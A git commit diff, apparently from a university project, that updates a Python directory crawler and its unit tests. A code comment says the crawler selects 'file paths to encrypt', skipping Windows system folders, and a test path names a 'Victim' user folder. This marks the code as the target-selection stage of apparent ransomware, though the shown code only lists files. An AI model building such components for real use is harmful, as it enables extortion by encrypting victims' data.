1d8155b89495441db3a35b8468cf98c520f1db5b
duiker2 <duiker2@illinois.edu>
2017-03-27 21:37:57 -0500

    Crawler and unit tests working

--- crawler/crawler.py
+++ crawler/crawler.py
@@ -1,24 +1,25 @@
 import os
-print("crawling...")
-
-dirs_to_skip = ["Program Files (x86)", "Program Files", "Windows"]
 
 # crawl files and return file paths to encrypt
-def crawl_files(start_dir):
+def crawl_files(start_dir, dirs_to_skip):
+    print("crawling")
+    result = []
     for path, dirs, files in os.walk(start_dir):
+        print(path)
         if should_skip(path, dirs_to_skip):
             continue
         for name in files:
-            print(path + '\\' + name)
+            result.append(path + '\\' + name)
+    return result
 
 # true if this directory should be skipped
 def should_skip(path, dirs_to_skip):
     for dir in dirs_to_skip:
-        start_index = len(path)-len(dir)
-        if(start_index >= 0):
-            if path[start_index:] == dir:
-                return True
+        if dir in path:
+            return True
     return False
 
 if __name__ == "__main__":
-    crawl_files("./crawler/crawler_test_dir")
+    dirs_to_skip = ["Program Files (x86)", "Program Files", "Windows"]
+    start_dir = "./crawler_test_dir"
+    print(crawl_files(start_dir, dirs_to_skip))
--- crawler/crawler_tester.py
+++ crawler/crawler_tester.py
@@ -2,14 +2,24 @@ import unittest
 import crawler
 
 class CrawlerTester(unittest.TestCase):
+    dirs_to_skip = ["Program Files (x86)", "Program Files", "Windows",
+                    "Really Long Directory Name to Test For Length Issues"]
+    start_dir = "./crawler_test_dir"
 
     def test_should_skip(self):
-        dirs_to_skip = ["Program Files (x86)", "Program Files", "Windows", "Really Long Directory Name to Test Index Out of Bounds"]
-        self.assertTrue(crawler.should_skip(r"Windows", dirs_to_skip))
-        self.assertTrue(crawler.should_skip(r"./crawler/crawler_test_dir\Windows", dirs_to_skip))
-        self.assertTrue(crawler.should_skip(r"./crawler/crawler_test_dir\Program Files (x86)", dirs_to_skip))
-        self.assertTrue(crawler.should_skip(r"./crawler/crawler_test_dir\Program Files", dirs_to_skip))
-        self.assertFalse(crawler.should_skip(r"./crawler/crawler_test_dir\Users\Victim\Videos", dirs_to_skip))
+        self.assertTrue(crawler.should_skip(r"Windows", self.dirs_to_skip))
+        self.assertTrue(crawler.should_skip(r"./crawler/crawler_test_dir\Windows", self.dirs_to_skip))
+        self.assertTrue(crawler.should_skip(r"./crawler/crawler_test_dir\Program Files (x86)", self.dirs_to_skip))
+        self.assertTrue(crawler.should_skip(r"./crawler/crawler_test_dir\Program Files", self.dirs_to_skip))
+        self.assertFalse(crawler.should_skip(r"./crawler/crawler_test_dir\Users\Victim\Videos", self.dirs_to_skip))
+
+    def test_crawl_files(self):
+        result = crawler.crawl_files(self.start_dir, self.dirs_to_skip)
+        print(result)
+        assert result is not None
+        assert len(result) > 0
+        for path in result:
+            assert("dont touch" not in path)
 
 if __name__ == '__main__':
     unittest.main()
